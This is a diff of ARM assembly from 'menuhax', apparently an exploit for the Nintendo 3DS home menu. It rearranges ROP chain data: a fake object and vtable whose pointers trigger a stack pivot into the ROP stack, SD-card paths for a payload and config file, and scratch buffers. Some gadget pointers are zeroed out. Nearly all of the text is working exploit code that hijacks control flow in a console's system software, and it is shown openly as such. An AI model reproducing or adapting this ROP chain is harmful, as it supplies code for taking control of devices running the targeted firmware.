@@ -15,98 +15,6 @@ ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump t
 .word 0 @ r5
 .word 0 @ r6
 
-@ Stack-pivot to ropstackstart.
-ROPMACRO_STACKPIVOT ROPBUFLOC(ropstackstart), ROP_POPPC
-
-object:
-.word ROPBUFLOC(vtable) @ object+0, vtable ptr
-.word 0
-.word 0
-.word 0
-
-.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
-
-.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
-stackpivot_sploadword:
-.word ROPBUFLOC(ropstackstart) @ sp
-stackpivot_pcloadword:
-.word ROP_POPPC @ pc
-
-vtable:
-.word 0, 0 @ vtable+0
-.word 0
-.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
-.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16
-
-tmpdata:
-
-#ifndef ENABLE_LOADROPBIN
-nss_outprocid:
-.word 0
-
-#if NEW3DS==0
-#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
-#else
-#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
-#endif
-
-nsslaunchtitle_programidlow_list:
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
-.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN
-
-/*nss_servname:
-.ascii "ns:s"*/
-#endif
-
-#ifdef LOADSDPAYLOAD
-IFile_ctx:
-.space 0x20
-
-#ifndef ENABLE_LOADROPBIN
-sdfile_path:
-.string16 "sd:/menuhax/menuhax_payload.bin"
-.align 2
-#else
-sdfile_ropbin_path:
-.string16 ROPBINPAYLOAD_PATH
-.align 2
-#endif
-#endif
-
-#ifdef LOADSDCFG
-sdfile_cfg_path:
-.string16 "sd:/menuhax/menuhax_cfg.bin"
-.align 2
-#endif
-
-#ifdef ENABLE_IMAGEDISPLAY
-#ifdef ENABLE_IMAGEDISPLAY_SD
-sdfile_imagedisplay_path:
-.string16 "sd:/menuhax/menuhax_imagedisplay.bin"
-.align 2
-#endif
-#endif
-
-#ifdef LOADSDCFG
-menuhax_cfg:
-.space 0x2c
-
-menuhax_cfg_new:
-.space 0x2c
-#endif
-
-ropkit_cmpobject:
-.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
-.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
-
-tmp_scratchdata:
-.space 0x400
-
 ropstackstart:
 #ifdef LOADSDCFG
 @ Load the cfg file. Errors are ignored with file-reading.
@@ -501,8 +409,8 @@ newthread_rop_stackpivot_pcloadword:
 
 newthread_vtable:
 .word 0, 0 @ vtable+0
-.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
-.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
+.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
+.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
 
 newthread_ropkit_cmpobject:
@@ -520,7 +428,7 @@ newthread_sdfile_cfg_path:
 .align 2
 
 newthread_tmp_scratchdata:
-.space 0x400
+.space 0x20
 
 newthread_ropend:
 .word 0
@@ -594,6 +502,95 @@ codebinpayload_start:
 codedataend:
 .word 0
 #endif
+
+object:
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr
+.word 0
+.word 0
+.word 0
+
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+
+.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+stackpivot_sploadword:
+.word ROPBUFLOC(ropstackstart) @ sp
+stackpivot_pcloadword:
+.word ROP_POPPC @ pc
+
+vtable:
+.word 0, 0 @ vtable+0
+.word 0
+.word 0//STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
+.word 0//ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16
+
+tmpdata:
+
+#ifndef ENABLE_LOADROPBIN
+nss_outprocid:
+.word 0
+
+#if NEW3DS==0
+#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
+#else
+#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
+#endif
+
+nsslaunchtitle_programidlow_list:
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
+.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN
+
+/*nss_servname:
+.ascii "ns:s"*/
+#endif
+
+#ifdef LOADSDPAYLOAD
+IFile_ctx:
+.space 0x20
+
+#ifndef ENABLE_LOADROPBIN
+sdfile_path:
+.string16 "sd:/menuhax/menuhax_payload.bin"
+.align 2
+#else
+sdfile_ropbin_path:
+.string16 ROPBINPAYLOAD_PATH
+.align 2
+#endif
+#endif
+
+#ifdef LOADSDCFG
+sdfile_cfg_path:
+.string16 "sd:/menuhax/menuhax_cfg.bin"
+.align 2
+#endif
+
+#ifdef ENABLE_IMAGEDISPLAY
+#ifdef ENABLE_IMAGEDISPLAY_SD
+sdfile_imagedisplay_path:
+.string16 "sd:/menuhax/menuhax_imagedisplay.bin"
+.align 2
+#endif
+#endif
+
+#ifdef LOADSDCFG
+menuhax_cfg:
+.space 0x2c
+
+menuhax_cfg_new:
+.space 0x2c
+#endif
+
+ropkit_cmpobject:
+.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
+.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
+
+tmp_scratchdata:
+.space 0x20
 
 .align 4
 _end:
